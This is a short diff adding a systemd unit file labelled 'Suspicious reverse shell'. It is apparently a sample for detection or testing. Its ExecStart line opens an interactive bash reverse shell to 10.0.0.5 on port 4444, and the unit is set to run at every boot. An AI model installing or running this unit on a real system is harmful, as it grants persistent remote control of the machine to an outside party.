@@ -1,0 +1,8 @@
+[Unit]
+Description=Suspicious reverse shell
+
+[Service]
+ExecStart=/usr/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1'
+
+[Install]
+WantedBy=multi-user.target
